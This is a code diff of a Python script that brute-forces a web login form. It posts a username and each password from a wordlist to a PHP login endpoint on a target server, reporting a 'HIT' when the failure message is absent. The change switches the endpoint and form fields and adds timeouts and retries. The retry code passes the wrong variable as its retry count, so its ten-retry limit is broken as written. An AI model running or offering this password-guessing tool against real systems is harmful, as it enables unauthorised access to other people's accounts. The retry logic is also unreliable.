@@ -29,14 +29,24 @@ except Exception:
     die(f"couldn't open '{password_filename}', error was: {sys.exc_info()}")
 
 
-def send_request(counter, password, rich_results):
-    payload = {"user": username, "password": password, "permission": "KO"}
-    r = requests.post(f"http://{server_ip}/iden.php", data=payload)
-    # if r.status_code != 200:
-    #     die(f"Got non 200 status code: {r.status_code}\n\nResponse was: {r.content}")
-    if match_string not in str(r.content):
-        print(f"We got a HIT! \n\n{r.content}\n\nMatched password was: {password}")
-        sys.exit(0) 
+def send_request(counter, password, rich_results, retries=0):
+    payload = {"user": username, "password": password, "ident": "Entra"}
+    try:
+        r = requests.post(f"http://{server_ip}/palm/palm.php", data=payload, timeout=2)
+        if r.status_code != 200:
+             print(f"Got non 200 status code: {r.status_code}\n\nResponse was: {r.content}, \nThis may or may not be expected behaviour, carrying on..")
+        if match_string not in str(r.content):
+            print(f"We got a HIT! \n\n{r.content}\n\nMatched password was: {password}")
+            sys.exit(0) 
+    except Exception:
+        print(f"Got an exception: {sys.exc_info()}")
+        if "timeout" in str(sys.exc_info()).lower():
+            if retries < 10:
+                print("Got a timeout, trying again up to 10 times")
+                send_request(counter, password, rich_results, counter+1)
+            else:
+                die("Aborting after 10 timeouts")
+        
 
 counter = 0
 modulo = 100
